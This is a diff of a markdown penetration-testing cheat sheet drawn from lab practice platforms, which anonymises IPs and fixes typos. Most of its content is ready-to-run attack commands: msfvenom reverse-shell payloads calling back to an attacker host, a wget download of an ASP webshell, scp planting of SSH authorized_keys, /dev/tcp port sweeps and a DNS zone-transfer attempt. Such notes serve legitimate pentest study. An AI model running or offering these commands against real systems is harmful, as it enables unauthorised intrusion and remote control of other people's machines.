@@ -8,7 +8,7 @@
 - [PT initial foothold](#pt-initial-foothold)
 - [SSH notes](#ssh-notes)
 - [FTP notes](#ftp-notes)
-- [Git commands / shell](#git-commands-shell)
+- [Git commands / shell](#git-commands--shell)
 - [Remote Desktop](#remote-desktop)
 - [SQL connections](#sql-connections)
 - [Reverse engineering](#reverse-engineering)
@@ -45,7 +45,7 @@
   - example: `windows/meterpreter_reverse_tcp`
 
 **Active directory**
-There can be multiple domains. This is called a tree, a parent domain and other child domains. With many trees you start to have a forest. Inside are the Organization Unites, objects.
+There can be multiple domains. This is called a tree, a parent domain and other child domains. With many trees you start to have a forest. Inside are the Organization Units, objects.
 
 Trust:
 - Directional: one domain trust one domain
@@ -98,48 +98,48 @@ Default Credentials
 ## PT initial foothold
 
 **Light way scan**
-1. `ports=$(nmap -p- --min-rate=1000 -T4 192.168.134.126 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`
+1. `ports=$(nmap -p- --min-rate=1000 -T4 <TARGET_IP> | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`
 2. `echo $ports`
-3. `nmap -p$ports -sC -sV 192.168.134.126 -oN nmap_results`
+3. `nmap -p$ports -sC -sV <TARGET_IP> -oN nmap_results`
    - `sU` for UDP, `sT` for TCP
 
 **More scans**
-- `nmap -T4 -p- --min-rate=1000 -sV -sC -vvv -oN nmap_results 192.168.134.114 -Pn`
-- `for i in {1..65535}; do (echo > /dev/tcp/172.17.0.1/$i) >/dev/null 2>&1 && echo $i is open; done`
-- `dig @192.168.212.165 AXFR heist.offsec`
-- `dnsenum 192.168.212.165`
-- `autorecon 192.168.228.109`
-- `rustscan --ulimit 5000 192.168.220.131`
+- `nmap -T4 -p- --min-rate=1000 -sV -sC -vvv -oN nmap_results <TARGET_IP> -Pn`
+- `for i in {1..65535}; do (echo > /dev/tcp/<TARGET_IP>/$i) >/dev/null 2>&1 && echo $i is open; done`
+- `dig @<DNS_IP> AXFR <DOMAIN>`
+- `dnsenum <TARGET_IP>`
+- `autorecon <TARGET_IP>`
+- `rustscan --ulimit 5000 <TARGET_IP>`
 - `nikto -host=http://www.targetcorp.com -maxtime=30s`
 
 **Fast way**
-1. `masscan -p1-65535 10.10.10.93 --rate=1000 -e tun0 > ports`
+1. `masscan -p1-65535 <TARGET_IP> --rate=1000 -e tun0 > ports`
 2. `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
-3. `nmap -Pn -sV -sC -p$ports 10.10.10.93`
+3. `nmap -Pn -sV -sC -p$ports <TARGET_IP>`
 
 **Checklist**
 - Top 100 ports: `TCP(100;7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157)`
 - Check always the source code for comments and secrets
-  - maybe a functionality has been disabled and can be renabled
+  - maybe a functionality has been disabled and can be re-enabled
   - maybe you can find secrets
 
-**If you find an unkwon service, try again this command**
-- `sudo nmap -sC -sV -p PORTNUMBER -sU 10.10.10.116`
+**If you find an unknown service, try again this command**
+- `sudo nmap -sC -sV -p <PORT> -sU <TARGET_IP>`
 
 **Other ways**
-- `for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`
-- `for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`
+- `for i in {1..255}; do (ping -c 1 <SUBNET>.${i} | grep "bytes from" &); done`
+- `for i in {1..65535}; do (echo > /dev/tcp/<TARGET_IP>/$i) >/dev/null 2>&1 && echo $i is open; done`
 
 ## SSH notes
 
 - `scp username@remoteHost:/remote/dir/file.txt /local/dir/`
-  - `scp Administrator@10.10.210.84:"/C:/Users/Administrator/Downloads/20230824142942_loot.zip" "/home/kali/Documents/engagements/TryHackMe/Post-Exploitation Basics/loot.zip"`
+  - `scp Administrator@<TARGET_IP>:"/C:/Users/Administrator/Downloads/loot.zip" "/local/path/loot.zip"`
 - `pscp.exe username@remoteHost:/remote/dir/file.txt d:\`
 - Run [ssh-audit](https://github.com/jtesta/ssh-audit) for ssh server & client configuration auditing.
 
 **ssh exploitation**
-- `scp -O /home/kali/Documents/engagements/proving-grounds/Sorcerer/max/authorized_keys max@192.168.240.100:/home/max/.ssh/authorized_keys`
-  - `mv /home/kali/Documents/engagements/proving-grounds/Sorcerer/max/ /home/kali/.ssh/id_rsa`
+- `scp -O authorized_keys <USER>@<TARGET_IP>:/home/<USER>/.ssh/authorized_keys`
+  - `mv id_rsa ~/.ssh/id_rsa`
   - https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/sorcerer
 
 **Create ssh keys**
@@ -147,7 +147,7 @@ Default Credentials
 - `sudo cp /root/.ssh/id_rsa.pub authorized_keys`
 - `cd /home/benoit/.ssh`
 - `put authorized_keys`
-- `sudo ssh benoit@192.168.218.233 -i /root/.ssh/id_rsa`
+- `sudo ssh <USER>@<TARGET_IP> -i /root/.ssh/id_rsa`
 
 ## FTP notes
 
@@ -205,7 +205,7 @@ Default Credentials
 
 **SQLite3**
 - If you have found a db, you can open it manually or with `sqlite3 Audit.db`
-- Second option, commands: `.tables`, `selecet * fom tableOfUsers;`
+- Second option, commands: `.tables`, `select * from tableOfUsers;`
 
 **MongoDB**
 - `mongo --host IP:PORT`
@@ -268,8 +268,7 @@ Default Credentials
   - `wget https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp -O cmd.asp`
   - try `.aspx` or `.mspx` to upload a cmd shell
   - another try:
-    1. https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc   (+)
-    2. https://github.com/autofac/Examples/blob/master/src/WebFormsExample/Site.Master.cs
+    1. https://github.com/autofac/Examples/blob/master/src/WebFormsExample/Site.Master.cs
     - See "Proving Grounds: Butch" https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html
   - `web.config` to run as an ASP: https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/
   - `cp /usr/share/webshells/config/web.config .`
@@ -322,16 +321,16 @@ If something goes wrong
 **msfvenom shells**
 - `msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64`
 - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 EXITFUNC=thread -f exe -o shell.exe`
-- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f exe -e 64/xor -o shell.exe`
-- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.163 LPORT=445 -f exe -o shell.exe`
-- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.163 LPORT=445 -f exe -o shell.exe`
-- `msfvenom -f psh-cmd -p windows/shell_reverse_tc LHOST=tun0 LPORT=8443 -o rev.ps1`
+- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -e 64/xor -o shell.exe`
+- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o shell.exe`
+- `msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o shell.exe`
+- `msfvenom -f psh-cmd -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8443 -o rev.ps1`
 - `msfvenom -f ps1 -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8443 -o rev.ps1`
-- `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f msi > shell.msi`
+- `msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi > shell.msi`
 - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 -f aspx > devel.aspx`
   - run with: `msiexec /quiet /qn /i shell.msi`
-- `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.231 LPORT=4242 -f elf > reverse.elf`
-- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f war > shell.war`
+- `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf > reverse.elf`
+- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > shell.war`
   - for file uploads in tomcat/manager
   - `setoolkit > 1 > 9 > 1`
 - Resources
